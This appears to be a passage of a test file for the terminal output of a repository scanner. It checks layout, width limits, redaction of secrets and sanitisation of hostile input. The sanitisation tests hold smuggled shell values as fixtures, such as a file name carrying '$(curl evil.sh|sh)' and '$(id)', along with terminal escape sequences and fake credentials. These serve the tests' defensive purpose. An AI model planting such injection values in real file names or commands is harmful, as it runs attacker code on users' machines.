import { describe, expect, it } from 'vitest'
import { isCopyableCommand } from '../../src/output/commands.ts'
import {
  describeGit,
  describeProjectType,
  displayRemote,
  formatPort,
  groupScripts,
  pickKeyFiles,
  servicePorts,
  sortBySeverity,
  sortByUrgency,
  topLanguages,
  uncoveredWarnings,
  variableRank,
  warningText,
  workflowLabel,
  workflowTasks,
  worstSeverity,
} from '../../src/output/shared/facts.ts'
import { categoryTitle } from '../../src/output/shared/labels.ts'
import { detailLine, formatNumber, formatShare, plural } from '../../src/output/shared/text.ts'
import { createStyle, defaultRenderOptions, type RenderOptions, stripAnsi } from '../../src/output/style.ts'
import { clean, fitLine, joinFit, lineWidth, paintLine, span, table, wrap } from '../../src/output/terminal/text.ts'
import { renderDoctor, renderScan } from '../../src/output/terminal.ts'
import type {
  Diagnostic,
  DoctorResult,
  EnvVariable,
  GitSection,
  ScanResult,
  Script,
  Service,
  Severity,
  Tool,
} from '../../src/types.ts'
import { emptyDoctor, makeResult, sampleScanResult } from '../factories.ts'
import { timeBudget } from '../helpers.ts'

// Same value as SECRET_SENTINEL in test/helpers.ts; not imported so these renderer
// tests stay independent from the scanner and CLI.
const SECRET = 'REPOLENS_FIXTURE_SECRET'
const ESC = String.fromCharCode(27)

function options(overrides: Partial<RenderOptions> & { color?: boolean; unicode?: boolean } = {}): RenderOptions {
  const { color = false, unicode = true, ...rest } = overrides
  return defaultRenderOptions({ style: createStyle({ color, unicode }), ...rest })
}

function lines(output: string): string[] {
  return stripAnsi(output).replace(/\n$/, '').split('\n')
}

function expectWithinWidth(output: string, width: number): void {
  for (const line of lines(output)) expect([...line].length, line).toBeLessThanOrEqual(width)
}

function variable(name: string, overrides: Partial<EnvVariable> = {}): EnvVariable {
  return {
    name,
    defined: false,
    documented: false,
    used: false,
    definedIn: [],
    documentedIn: [],
    usedIn: [],
    fallback: false,
    testOnly: false,
    public: false,
    sensitive: false,
    endpoints: [],
    suspiciousValueIn: [],
    ...overrides,
  }
}

function service(name: string, overrides: Partial<Service> = {}): Service {
  return {
    name,
    source: 'compose.yaml',
    kind: 'other',
    ports: [],
    expose: [],
    dependsOn: [],
    volumes: [],
    environment: [],
    envFiles: [],
    profiles: [],
    healthcheck: false,
    ...overrides,
  }
}

function script(name: string, overrides: Partial<Script> = {}): Script {
  return {
    name,
    command: `echo ${name}`,
    run: `npm run ${name}`,
    source: 'package.json',
    package: '.',
    category: 'other',
    ...overrides,
  }
}

function diagnostic(code: string, severity: Severity, overrides: Partial<Diagnostic> = {}): Diagnostic {
  return { code, severity, category: 'environment', message: `${code} message`, ...overrides }
}

function doctorOf(diagnostics: Diagnostic[], checks: DoctorResult['checks'] = []): DoctorResult {
  return {
    checks,
    diagnostics,
    summary: {
      passed: checks.filter((c) => c.status === 'passed').length,
      failed: checks.filter((c) => c.status === 'failed').length,
      skipped: checks.filter((c) => c.status === 'skipped').length,
      disabled: checks.filter((c) => c.status === 'disabled').length,
      errors: diagnostics.filter((d) => d.severity === 'error').length,
      warnings: diagnostics.filter((d) => d.severity === 'warning').length,
      infos: diagnostics.filter((d) => d.severity === 'info').length,
    },
  }
}

/** A Python repository: no frameworks, no package manager, Makefile targets and CI. */
function genericResult(): ScanResult {
  return makeResult({
    project: {
      name: 'data-tools',
      directory: 'data-tools',
      type: 'unknown',
      manifests: [],
      entrypoints: [],
      structure: [{ path: 'src', files: 40 }],
    },
    languages: [
      { name: 'Python', kind: 'programming', files: 40, share: 0.8 },
      { name: 'Shell', kind: 'programming', files: 9, share: 0.18 },
      { name: 'Markdown', kind: 'markup', files: 1, share: 0.004 },
    ],
    scripts: {
      runner: null,
      scripts: [
        script('install', { run: 'make install', source: 'Makefile', command: 'pip install -r requirements.txt' }),
        script('test', { run: 'make test', source: 'Makefile', command: 'pytest -q', category: 'test' }),
        script('run', { run: 'make run', source: 'Makefile', command: 'python -m app', category: 'dev' }),
      ].map(({ package: _package, ...rest }) => rest),
    },
    ci: {
      providers: [{ id: 'github-actions', name: 'GitHub Actions', files: ['.github/workflows/ci.yml'] }],
      workflows: [
        {
          provider: 'github-actions',
          file: '.github/workflows/ci.yml',
          triggers: ['push'],
          jobs: [{ id: 'test', tasks: ['test'], runsOn: ['ubuntu-latest'] }],
        },
      ],
    },
    configFiles: [
      { path: 'Makefile', category: 'build', description: 'Make targets' },
      { path: 'pyproject.toml', category: 'package', description: 'Python project metadata' },
      { path: '.github/workflows/ci.yml', category: 'ci', description: 'GitHub Actions workflow' },
      { path: '.editorconfig', category: 'editor', description: 'EditorConfig' },
    ],
  })
}

// ---------------------------------------------------------------------------
// renderScan
// ---------------------------------------------------------------------------

describe('renderScan', () => {
  it('renders the sample monorepo', () => {
    expect(renderScan(sampleScanResult(), options())).toMatchSnapshot()
  })

  it('renders the sample monorepo with ASCII symbols', () => {
    const output = renderScan(sampleScanResult(), options({ unicode: false }))
    expect(output).toMatchSnapshot()
    expect(output).not.toMatch(/[^\x20-\x7e\n]/)
  })

  it('renders verbose output with evidence, confidence and every list expanded', () => {
    const output = renderScan(sampleScanResult(), options({ verbose: true }))
    expect(output).toMatchSnapshot()
    expect(output).toContain('dependency nuxt@^4.1.2 in apps/web/package.json')
    expect(output).toContain('medium confidence')
    expect(output).toContain('Configuration files')
    expect(output).toContain('ENV_UNUSED')
    expect(output).toContain('Nested mappings are not allowed')
    expect(output).toContain('pnpm --filter @acme/web dev')
    expect(output).toContain('/products/:id')
  })

  it('renders only problems and the summary in quiet mode', () => {
    const output = renderScan(sampleScanResult(), options({ quiet: true }))
    expect(output).toMatchSnapshot()
    expect(output).not.toContain('Frameworks')
    expect(lines(output)[0]).toBe('Potential issues')
  })

  it('prints a single line in quiet mode when nothing needs attention', () => {
    const result = sampleScanResult()
    result.doctor = doctorOf([diagnostic('ENV_UNUSED', 'info')])
    expect(renderScan(result, options({ quiet: true }))).toBe('✓ No problems found\n')
  })

  it('keeps every line within a narrow terminal', () => {
    const output = renderScan(sampleScanResult(), options({ width: 60 }))
    expect(output).toMatchSnapshot()
    expectWithinWidth(output, 60)
  })

  it.each([40, 60, 80, 100, 140])('never exceeds %i columns, even verbose', (width) => {
    expectWithinWidth(renderScan(sampleScanResult(), options({ width })), width)
    expectWithinWidth(renderScan(sampleScanResult(), options({ width, verbose: true })), width)
    expectWithinWidth(renderScan(sampleScanResult(), options({ width, unicode: false })), width)
  })

  it('adds ANSI styles without changing the layout', () => {
    const colored = renderScan(sampleScanResult(), options({ color: true }))
    expect(colored).toContain(`${ESC}[`)
    expect(stripAnsi(colored)).toBe(renderScan(sampleScanResult(), options()))
    const verbose = renderScan(sampleScanResult(), options({ color: true, verbose: true, width: 60 }))
    expect(stripAnsi(verbose)).toBe(renderScan(sampleScanResult(), options({ verbose: true, width: 60 })))
  })

  it('shows a status symbol on every diagnostic line', () => {
    for (const unicode of [true, false]) {
      const style = createStyle({ color: false, unicode })
      const symbol = { error: style.symbols.fail, warning: style.symbols.warn, info: style.symbols.info }
      const output = lines(renderScan(sampleScanResult(), options({ unicode, verbose: true })))
      for (const d of sampleScanResult().doctor.diagnostics) {
        const line = output.find((l) => l.includes(d.code))
        expect(line, d.code).toBeDefined()
        expect(line?.trimStart().startsWith(`${symbol[d.severity]} ${d.code}`)).toBe(true)
      }
    }
  })

  it('renders a generic repository with Makefile targets, CI and key files', () => {
    const output = renderScan(genericResult(), options())
    expect(output).toMatchSnapshot()
    expect(output).toContain('make test')
    expect(output).toContain('Key files')
    expect(output).toContain('1. make install')
    expect(output).toContain('2. make run')
    expect(output).toContain('Markdown <1%')
  })

  it('renders an empty result without crashing', () => {
    const output = renderScan(makeResult(), options())
    expect(output).toMatchSnapshot()
    expect(output).toContain('RepoLens found no recognizable project files here.')
    expect(output).toContain('✓ No problems found')
  })

  it('is deterministic and does not mutate its input', () => {
    const result = sampleScanResult()
    const before = JSON.stringify(result)
    const first = renderScan(result, options({ verbose: true }))
    expect(renderScan(result, options({ verbose: true }))).toBe(first)
    expect(JSON.stringify(result)).toBe(before)
  })

  it('notes a truncated scan', () => {
    const result = makeResult({
      meta: { files: 100_000, truncated: true, warnings: [], config: { sources: [], settings: {} } },
    })
    const output = renderScan(result, options())
    expect(output).toContain('Scan stopped at the file limit (100,000 files)')
    expect(output).toContain('--max-files')
  })

  it('does not repeat a scan warning that a diagnostic already reports, except in verbose mode', () => {
    const result = sampleScanResult()
    result.doctor.diagnostics.push(
      diagnostic('CONFIG_PARSE_ERROR', 'warning', {
        category: 'configuration',
        message: "Couldn't parse apps/legacy/docker-compose.yml",
      }),
    )
    const output = renderScan(result, options())
    expect(output).not.toContain('Notes')
    expect(output).not.toContain("RepoLens couldn't parse")
    expect(renderDoctor(result, options())).not.toContain('scan warning')
    expect(renderScan(result, options({ verbose: true }))).toContain('Nested mappings are not allowed')
    expect(renderDoctor(result, options({ verbose: true }))).toContain('Nested mappings are not allowed')
  })

  it('names CI configuration that could not be broken into workflows', () => {
    const result = makeResult({
      ci: { providers: [{ id: 'gitlab-ci', name: 'GitLab CI', files: ['.gitlab-ci.yml'] }], workflows: [] },
    })
    const output = lines(renderScan(result, options()))
    expect(output).toContain('CI  GitLab CI')
    expect(output).toContainEqual(expect.stringMatching(/^ {2}\.gitlab-ci\.yml\s+not analyzed$/))
  })

  it('summarizes scan warnings and hides details unless verbose', () => {
    const output = renderScan(sampleScanResult(), options())
    expect(output).toContain("RepoLens couldn't parse apps/legacy/docker-compose.yml")
    expect(output).toContain('Run with --verbose to see technical details.')
    expect(output).not.toContain('Nested mappings')
  })

  describe('environment', () => {
    it('lists problems first, then alphabetically, and caps the list', () => {
      const variables = [
        ...Array.from({ length: 14 }, (_, i) =>
          variable(`OK_${String(i).padStart(2, '0')}`, { defined: true, documented: true, used: true }),
        ),
        variable('UNDOCUMENTED', { used: true }),
      ]
      const result = makeResult({
        environment: {
          files: [{ path: '.env', kind: 'local', variables: 14, ignored: true, tracked: false }],
          variables,
          usageTruncated: false,
        },
      })
      const output = lines(renderScan(result, options()))
      const start = output.findIndex((l) => l.startsWith('Environment'))
      expect(output[start]).toBe('Environment  15 variables · .env')
      // No example file exists, so the example column shows a dash rather than a cross.
      expect(output[start + 2]).toMatch(/^ {2}UNDOCUMENTED\s+✗\s+–\s+✓$/)
      expect(output.filter((l) => /^ {2}OK_\d\d/.test(l))).toHaveLength(11)
      expect(output).toContain('  … 3 more (use --verbose)')
      expect(renderScan(result, options({ verbose: true }))).toContain('OK_13')
    })

    it('shows a dash and a note when there is no local env file', () => {
      const result = makeResult({
        environment: {
          files: [{ path: '.env.example', kind: 'example', variables: 1, ignored: false, tracked: true }],
          variables: [variable('PORT', { documented: true, used: true })],
          usageTruncated: true,
        },
      })
      const unicode = lines(renderScan(result, options()))
      expect(unicode).toContainEqual(expect.stringMatching(/^ {2}PORT\s+–\s+✓\s+✓$/))
      expect(unicode).toContain('  – file not present (.env)')
      expect(unicode.join('\n')).toContain('Source scan stopped early')
      const ascii = lines(renderScan(result, options({ unicode: false })))
      expect(ascii).toContainEqual(expect.stringMatching(/^ {2}PORT\s+-\s+\+\s+\+$/))
    })

    it('tags public variables and, in verbose mode, secrets and endpoints', () => {
      const result = makeResult({
        environment: {
          files: [],
          variables: [
            variable('VITE_API_URL', {
              used: true,
              public: true,
              endpoints: [{ file: '.env.example', scheme: 'https', port: null, local: false }],
            }),
            variable('JWT_SECRET', { used: true, sensitive: true }),
          ],
          usageTruncated: false,
        },
      })
      const quietTags = renderScan(result, options())
      expect(quietTags).toContain('public')
      expect(quietTags).not.toContain('secret')
      const verbose = renderScan(result, options({ verbose: true }))
      expect(verbose).toMatch(/JWT_SECRET.*secret/)
      expect(verbose).toMatch(/VITE_API_URL.*public, https/)
    })
  })

  describe('scripts', () => {
    it('orders root scripts by category, then task runner targets; workspace scripts only in verbose', () => {
      const result = makeResult({
        scripts: {
          runner: 'npm run',
          scripts: [
            script('lint', { category: 'lint' }),
            script('prepare', { category: 'setup' }),
            script('build', { category: 'build' }),
            script('dev', { category: 'dev' }),
            script('test', { run: 'npm test', category: 'test' }),
            script('deploy', { run: 'make deploy', source: 'Makefile', category: 'deploy' }),
            script('dev', {
              run: 'npm run dev -w web',
              source: 'web/package.json',
              package: 'web',
              category: 'dev',
            }),
          ],
        },
      })
      const output = lines(renderScan(result, options()))
      const runs = output.filter((l) => /^ {2}(npm|make) /.test(l)).map((l) => l.trim().split(/\s{2,}/)[0])
      expect(runs).toEqual([
        'npm run dev',
        'npm run build',
        'npm test',
        'npm run lint',
        'npm run prepare',
        'make deploy',
      ])
      expect(output).toContain('  … 1 script in a workspace package (use --verbose)')
      const verbose = lines(renderScan(result, options({ verbose: true })))
      expect(verbose).toContain('  web')
      expect(verbose).toContainEqual(expect.stringMatching(/^ {4}npm run dev -w web\s+echo dev$/))
    })

    it('caps root scripts at 10 unless verbose', () => {
      const scripts = Array.from({ length: 13 }, (_, i) => script(`task${i}`))
      const result = makeResult({ scripts: { runner: 'npm run', scripts } })
      const output = renderScan(result, options())
      expect(output).toContain('npm run task9')
      expect(output).not.toContain('npm run task10')
      expect(output).toContain('… 3 more (use --verbose)')
      expect(renderScan(result, options({ verbose: true }))).toContain('npm run task12')
    })

    it('puts a long run command on its own line instead of cutting it', () => {
      const run = 'pnpm --filter @acme/very-long-package-name build:production'
      const result = makeResult({ scripts: { runner: 'pnpm', scripts: [script('build', { run })] } })
      const output = lines(renderScan(result, options({ width: 80 })))
      expect(output).toContain(`  ${run}`)
    })
  })

  describe('routes', () => {
    it('summarizes pages unless verbose and marks uncertain prefixes once', () => {
      const output = lines(renderScan(sampleScanResult(), options()))
      expect(output).toContain('Routes  5 API · 2 pages')
      expect(output).toContain('  … 2 pages not listed (use --verbose)')
      expect(output.filter((l) => l.includes('? prefix may apply'))).toHaveLength(1)
      expect(output).toContainEqual(expect.stringMatching(/^ {2}POST {4}\/api\/orders \?\s+apps\/api/))
      expect(output.join('\n')).not.toContain('/products/:id')
    })

    it('lists pages when there are no API routes', () => {
      const result = makeResult({
        routes: {
          truncated: false,
          routes: [
            {
              method: 'GET',
              path: '/',
              kind: 'page',
              framework: 'nuxt',
              file: 'app/pages/index.vue',
              confidence: 'high',
            },
          ],
        },
      })
      expect(lines(renderScan(result, options()))).toContain('  page    /  app/pages/index.vue')
    })

    it('caps API routes at 15', () => {
      const routes = Array.from({ length: 20 }, (_, i) => ({
        method: 'GET' as const,
        path: `/r${i}`,
        kind: 'api' as const,
        framework: 'express',
        file: 'src/app.js',
        line: i + 1,
        confidence: 'high' as const,
      }))
      const output = renderScan(makeResult({ routes: { routes, truncated: true } }), options())
      expect(output).toContain('/r14')
      expect(output).not.toContain('/r15 ')
      expect(output).toContain('… 5 more (use --verbose)')
      expect(output).toContain('Route scan stopped early')
    })
  })

  describe('services', () => {
    it('formats published, bound and container-only ports', () => {
      const result = makeResult({
        services: {
          composeFiles: ['compose.yaml', 'compose.override.yaml'],
          dockerfiles: [],
          services: [
            service('api', {
              build: '.',
              kind: 'app',
              ports: [{ host: 3000, container: 3000, protocol: 'tcp', raw: '3000:3000' }],
              expose: ['9229'],
            }),
            service('cache', {
              image: 'redis:8',
              kind: 'cache',
              technology: { id: 'redis', name: 'Redis' },
              ports: [
                { host: 6379, container: 6379, protocol: 'tcp', hostIp: '127.0.0.1', raw: '127.0.0.1:6379:6379' },
              ],
              profiles: ['dev'],
            }),
          ],
        },
      })
      const output = lines(renderScan(result, options()))
      expect(output).toContain('Services  compose.yaml, compose.override.yaml')
      expect(output).toContainEqual(expect.stringMatching(/^ {2}api\s+build \.\s+:3000 9229\s+app$/))
      expect(output).toContainEqual(
        expect.stringMatching(/^ {2}cache\s+redis:8\s+127\.0\.0\.1:6379\s+Redis {2}profile dev$/),
      )
    })

    it('shows Dockerfiles on their own when there is no Compose file', () => {
      const result = makeResult({
        services: {
          composeFiles: [],
          services: [],
          dockerfiles: [
            {
              path: 'Dockerfile',
              baseImages: ['golang:1.25', 'gcr.io/distroless/static'],
              stages: 2,
              exposes: ['8080'],
              args: [],
            },
          ],
        },
      })
      const output = lines(renderScan(result, options()))
      expect(output).toContain('Dockerfiles')
      expect(output).toContain('  Dockerfile  gcr.io/distroless/static  2 stages  expose 8080')
    })
  })

  describe('safety', () => {
    it('strips control and bidi characters coming from the repository', () => {
      const result = sampleScanResult()
      result.project.name = `evil${ESC}[2J${ESC}]0;pwned${String.fromCharCode(7)}`
      result.project.description = `line one\nline two${String.fromCharCode(0x202e)}txt.exe`
      result.scripts.scripts.push(script('x', { command: `echo ${ESC}[31mred`, run: 'pnpm x' }))
      result.environment.variables.push(variable(`BAD${String.fromCharCode(0x9b)}NAME`, { used: true }))
      for (const render of [renderScan, renderDoctor]) {
        const output = render(result, options({ verbose: true }))
        expect(output).not.toContain(ESC)
        expect(output).not.toContain(String.fromCharCode(7))
        expect(output).not.toContain(String.fromCharCode(0x9b))
        expect(output).not.toContain(String.fromCharCode(0x202e))
      }
      expect(renderScan(result, options())).toContain('line one line two')
    })

    it('stays fast and stack-safe on hostile input sizes', () => {
      const result = sampleScanResult()
      result.project.description = `${' '.repeat(200_000)}x${' '.repeat(200_000)}`
      result.doctor.diagnostics.push(diagnostic('HUGE', 'warning', { message: 'a'.repeat(200_000) }))
      ;(result.git as GitSection).remotes = [
        { name: 'origin', url: `https://github.com/acme/x${'/'.repeat(100_000)}.` },
      ]
      result.environment.variables = Array.from({ length: 150_000 }, (_, i) => variable(`VAR_${i}`, { used: true }))
      const started = performance.now()
      const output = renderScan(result, options({ verbose: true, width: 80 }))
      renderDoctor(result, options({ verbose: true, width: 80 }))
      expect(performance.now() - started).toBeLessThan(timeBudget(10_000))
      expect(output).toContain('VAR_149999')
      expect(lines(output)[1]).toBe('x')
      expectWithinWidth(output, 80)
    })

    it('never prints secrets echoed in commands, remotes, evidence or diagnostics', () => {
      const stripeKey = `sk_${'live'}_${'a1B2c3D4e5F6g7H8i9J0'}`
      const result = sampleScanResult()
      result.scripts.scripts.unshift(
        script('seed', { command: `API_TOKEN=${SECRET} node seed.js --password ${SECRET}`, run: 'pnpm seed' }),
        script('pay', { command: `STRIPE=${stripeKey} node pay.js`, run: 'pnpm pay' }),
      )
      ;(result.git as GitSection).remotes = [
        { name: 'origin', url: `https://deploy:${SECRET}@github.com/acme/acme-api.git`, host: 'github' },
      ]
      result.frameworks[0]?.evidence.push(`config file with ${stripeKey}`)
      result.doctor.diagnostics.push(
        diagnostic('SCRIPT_SECRET', 'warning', { message: `script uses DB_PASSWORD=${SECRET}`, hint: stripeKey }),
      )
      result.meta.warnings.push({
        kind: 'parse',
        message: "Couldn't parse x.json",
        detail: `Unexpected token near "${stripeKey}"`,
      })
      for (const verbose of [false, true]) {
        const outputs = [
          renderScan(result, options({ verbose })),
          renderDoctor(result, options({ verbose })),
          renderScan(result, options({ verbose, width: 60 })),
        ]
        for (const output of outputs) {
          expect(output).not.toContain(SECRET)
          expect(output).not.toContain(stripeKey)
        }
      }
      expect(renderScan(result, options())).toContain('github.com/acme/acme-api')
    })

    it('redacts a credential even when an invisible character splits it', () => {
      const zeroWidth = String.fromCharCode(0x200b)
      const key = `sk_${'live'}_${'a1B2c3D4'}${zeroWidth}${'e5F6g7H8i9J0'}`
      const result = makeResult({
        scripts: { runner: 'npm run', scripts: [script('pay', { command: `node pay.js ${key}` })] },
      })
      const output = renderScan(result, options({ verbose: true }))
      expect(output).toContain('node pay.js ***')
      expect(output).not.toContain(key.replace(zeroWidth, ''))
    })

    it('keeps parser source snippets out of warning details', () => {
      const detail = `Unexpected token 'R', ..."password": ${SECRET}"... is not valid JSON`
      const result = makeResult({
        meta: {
          files: 1,
          config: { sources: [], settings: {} },
          truncated: false,
          warnings: [{ kind: 'parse', file: 'config.json', message: "Couldn't parse config.json", detail }],
        },
      })
      // The real V8 message for the same mistake, whatever its exact wording today.
      let real = ''
      try {
        JSON.parse(`{"db": {"password": ${SECRET}}}`)
      } catch (error) {
        real = (error as Error).message
      }
      result.meta.warnings.push({ kind: 'parse', file: 'db.json', message: "Couldn't parse db.json", detail: real })
      for (const render of [renderScan, renderDoctor]) {
        const output = render(result, options({ verbose: true }))
        expect(output).not.toContain(SECRET)
        expect(output).toContain("Unexpected token 'R' (not valid JSON)")
      }
    })

    it('never suggests a quick-start command built from a hostile file name', () => {
      const result = makeResult({
        environment: {
          files: [
            { path: '.env.example$(curl evil.sh|sh)', kind: 'example', variables: 0, ignored: false, tracked: true },
          ],
          variables: [],
          usageTruncated: false,
        },
        packageManagers: {
          primary: { id: 'npm', name: 'npm', lockfiles: [], declared: false, evidence: [] },
          detected: [],
        },
      })
      const output = lines(renderScan(result, options()))
      const start = output.indexOf('Quick start')
      // The file name is quoted, so pasting the command copies a file instead of running curl.
      expect(output[start + 1]).toMatch(/^ {2}1\. cp '\.env\.example\$\(curl evil\.sh\|sh\)' \.env\b/)
      expect(output[start + 2]).toMatch(/^ {2}2\. npm install\b/)
    })

    it('redacts credentials in a Compose build context', () => {
      const result = makeResult({
        services: {
          composeFiles: ['compose.yaml'],
          dockerfiles: [],
          services: [service('api', { kind: 'app', build: `https://deploy:${SECRET}@github.com/acme/api.git#main` })],
        },
      })
      const output = renderScan(result, options({ verbose: true }))
      expect(output).not.toContain(SECRET)
      expect(output).not.toContain('deploy:')
      expect(output).toContain('build https://***@github')
    })
  })

  describe('narrow terminals', () => {
    it('wraps diagnostics below their code instead of cutting them', () => {
      const sample = sampleScanResult()
      for (const width of [32, 40, 48]) {
        const doctor = renderDoctor(sample, options({ width }))
        const quiet = renderScan(sample, options({ width, quiet: true }))
        expectWithinWidth(doctor, width)
        expectWithinWidth(quiet, width)
        expect(doctor, `doctor at ${width}`).not.toContain('…')
        expect(quiet, `scan at ${width}`).not.toContain('…')
        const doctorWords = lines(doctor).join(' ').split(/\s+/)
        const scanWords = lines(quiet).join(' ').split(/\s+/)
        for (const d of sample.doctor.diagnostics) {
          for (const word of `${d.message} ${d.hint ?? ''}`.split(' ').filter(Boolean)) {
            expect(doctorWords, `${word} at ${width}`).toContain(word)
          }
          if (d.severity === 'info') continue
          for (const word of d.message.split(' ')) expect(scanWords, `${word} at ${width}`).toContain(word)
        }
      }
    })

    it('keeps the stacked layout readable', () => {
      const output = lines(renderDoctor(sampleScanResult(), options({ width: 40 })))
      const at = output.indexOf('    ✗ TRACKED_ENV_FILE')
      expect(at).toBeGreaterThan(-1)
      expect(output[at + 1]).toBe('      .env is tracked by Git')
      expect(output[at + 2]).toMatch(/^ {6}→ Run `git rm --cached/)
      expect(output[at + 3]).toMatch(/^ {8}\S/)
    })

    it('keeps tool names when there is no room for the test file count', () => {
      const output = lines(renderScan(sampleScanResult(), options({ width: 30 })))
      expect(output.find((l) => l.trimStart().startsWith('Testing'))).toContain('Vitest')
      expect(lines(renderScan(sampleScanResult(), options()))).toContain(
        '  Testing          Vitest, Playwright  (23 test files)',
      )
    })

    it('shows verbose route notes in full on their own line', () => {
      const output = lines(renderScan(sampleScanResult(), options({ verbose: true, width: 60 })))
      const at = output.findIndex((l) => l.includes('/api/orders ?'))
      expect(output[at + 1]).toBe('          registered inside a plugin; a prefix may apply')
      expectWithinWidth(output.join('\n'), 60)
    })
  })
})

// ---------------------------------------------------------------------------
// renderDoctor
// ---------------------------------------------------------------------------

describe('renderDoctor', () => {
  it('renders the sample diagnostics by category', () => {
    const output = renderDoctor(sampleScanResult(), options())
    expect(output).toMatchSnapshot()
    const categories = lines(output).filter((l) => /^\S/.test(l) && !l.startsWith('RepoLens'))
    // Security first, so its errors are the first thing on screen.
    expect(categories.slice(0, 4)).toEqual(['✗ Security', '⚠ Runtime', '⚠ Environment', '✓ Tooling'])
  })

  it('renders with ASCII symbols', () => {
    const output = renderDoctor(sampleScanResult(), options({ unicode: false }))
    expect(output).toMatchSnapshot()
    expect(output).not.toMatch(/[^\x20-\x7e\n]/)
    expect(output).toContain('Summary  x 1 error, ! 2 warnings, i 1 info, + 18 passed')
  })

  it('hides passing categories and hints in quiet mode', () => {
    const output = renderDoctor(sampleScanResult(), options({ quiet: true }))
    expect(output).toMatchSnapshot()
    expect(output).not.toContain('Tooling')
    expect(output).not.toContain('→')
    expect(output).not.toContain('--json')
  })

  it('lists passing checks, skipped counts, files and scan notes in verbose mode', () => {
    const result = sampleScanResult()
    result.doctor.checks.push({ code: 'DOCKER_X', title: 'Docker check', category: 'tooling', status: 'skipped' })
    result.doctor.summary.skipped = 1
    const output = renderDoctor(result, options({ verbose: true }))
    expect(output).toMatchSnapshot()
    expect(output).toContain('✓ Passing check 0')
    expect(output).toContain('✓ Tooling  1 skipped')
    expect(output).toContain('Files: .nvmrc, apps/api/Dockerfile')
    expect(output).toContain('1 skipped')
    expect(output).toContain('Nested mappings are not allowed')
  })

  it('wraps messages and hints within a narrow terminal', () => {
    const output = renderDoctor(sampleScanResult(), options({ width: 60 }))
    expect(output).toMatchSnapshot()
    expectWithinWidth(output, 60)
    for (const width of [40, 80, 120]) {
      expectWithinWidth(renderDoctor(sampleScanResult(), options({ width, verbose: true })), width)
    }
  })

  it('adds ANSI styles without changing the layout', () => {
    const colored = renderDoctor(sampleScanResult(), options({ color: true }))
    expect(colored).toContain(`${ESC}[`)
    expect(stripAnsi(colored)).toBe(renderDoctor(sampleScanResult(), options()))
  })

  it('shows a symbol on every diagnostic line', () => {
    const output = lines(renderDoctor(sampleScanResult(), options()))
    const symbols: Record<Severity, string> = { error: '✗', warning: '⚠', info: 'ℹ' }
    for (const d of sampleScanResult().doctor.diagnostics) {
      expect(output).toContainEqual(expect.stringMatching(new RegExp(`^ {4}${symbols[d.severity]} ${d.code}\\s`)))
    }
  })

  it('uses the worst severity per category and omits categories whose checks were all skipped', () => {
    const result = makeResult({
      doctor: doctorOf(
        [diagnostic('SCRIPT_PLACEHOLDER', 'info', { category: 'scripts', message: 'test script is a placeholder' })],
        [
          { code: 'SCRIPT_PLACEHOLDER', title: 'Scripts are real', category: 'scripts', status: 'failed' },
          { code: 'DOCKER_PORTS', title: 'Ports are unique', category: 'docker', status: 'skipped' },
          { code: 'GIT_ENV', title: 'Env files ignored', category: 'git', status: 'passed' },
        ],
      ),
    })
    const output = lines(renderDoctor(result, options()))
    expect(output).toContain('ℹ Scripts')
    expect(output).toContain('✓ Git')
    expect(output.join('\n')).not.toContain('Docker')
    expect(output.indexOf('ℹ Scripts')).toBeLessThan(output.indexOf('✓ Git'))
  })

  it('says so when there are no problems', () => {
    const result = makeResult({
      doctor: doctorOf([], [{ code: 'A', title: 'A works', category: 'runtime', status: 'passed' }]),
    })
    const output = renderDoctor(result, options())
    expect(output).toMatchSnapshot()
    expect(output).toContain('✓ No problems found')
    expect(output).toContain('Summary  ✓ 1 passed')
  })

  it('handles a result without any checks', () => {
    const output = renderDoctor(makeResult({ doctor: emptyDoctor() }), options())
    expect(output).toContain('✓ No problems found')
    expect(output).toContain('no checks apply to this repository')
  })

  it('keeps diagnostics in unknown categories', () => {
    const result = makeResult({
      doctor: doctorOf([diagnostic('NEW_THING', 'warning', { category: 'future-category' as Diagnostic['category'] })]),
    })
    expect(lines(renderDoctor(result, options()))).toContain('⚠ Future category')
  })
})

// ---------------------------------------------------------------------------
// Pure helpers
// ---------------------------------------------------------------------------

describe('format helpers', () => {
  it('displays Git remotes without credentials, scheme or .git', () => {
    expect(displayRemote('https://github.com/acme/api.git')).toBe('github.com/acme/api')
    expect(displayRemote(`https://user:${SECRET}@gitlab.com/acme/api.git`)).toBe('gitlab.com/acme/api')
    expect(displayRemote('git@github.com:acme/api.git')).toBe('github.com/acme/api')
    expect(displayRemote(`deploy:${SECRET}@example.com:acme/api`)).toBe('example.com/acme/api')
    expect(displayRemote('ssh://git@example.com:2222/acme/api.git')).toBe('example.com:2222/acme/api')
    expect(displayRemote('https://github.com/acme/api?token=abc#x')).toBe('github.com/acme/api')
    expect(displayRemote('/Users/someone/repos/api.git')).toBe('local path')
    expect(displayRemote('../api')).toBe('local path')
    expect(displayRemote('file:///srv/git/api.git')).toBe('local path')
    expect(displayRemote('C:\\repos\\api')).toBe('local path')
  })

  it('removes credentials from remotes that sanitizeUrl does not recognize', () => {
    expect(displayRemote(`user:${SECRET}@example.com/acme/api`)).toBe('example.com/acme/api')
    expect(displayRemote(`git::https://user:${SECRET}@example.com/acme/api`)).toBe('example.com/acme/api')
    expect(displayRemote(`${SECRET}@example.com:acme/api.git`)).toBe('example.com/acme/api')
    expect(displayRemote('git::file:///srv/git/api')).toBe('local path')
    expect(displayRemote('ssh://git@[::1]:2222/acme/api.git')).toBe('[::1]:2222/acme/api')
    // An "@" inside the path is not a credential separator.
    expect(displayRemote('https://github.com/acme/api/tree@v1')).toBe('github.com/acme/api/tree@v1')
    expect(displayRemote('   ')).toBe('')
  })

  it('never shows an empty remote', () => {
    const git: GitSection = {
      branch: 'main',
      head: 'abc1234',
      remotes: [{ name: 'origin', url: '' }],
      submodules: [],
      lfs: false,
      trackedFiles: 1,
      linkedWorktree: false,
    }
    expect(describeGit(git)).toEqual(['main @ abc1234'])
    expect(describeGit(git, 'https://github.com/acme/api')).toEqual(['main @ abc1234', 'github.com/acme/api'])
  })

  it('only offers commands that are safe to paste into a shell', () => {
    for (const command of [
      'cp .env.example .env',
      'docker compose -f docker/compose.dev.yml up -d',
      'pnpm --filter @acme/web dev',
      'npm run start:dev',
      'go run ./cmd/api',
      "cp 'a b' .env",
      "cp '.env.example$(id)' .env",
      "docker compose -f 'deploy/it'\\''s/compose.yaml' up -d",
      'cd apps/web && npm run dev',
    ]) {
      expect(isCopyableCommand(command), command).toBe(true)
    }
    for (const command of [
      'cp .env.example$(id) .env',
      'a;b',
      'a | b',
      'a&&b',
      'a `b`',
      "cp 'a b .env",
      'API_TOKEN=*** pnpm deploy',
      'a  b',
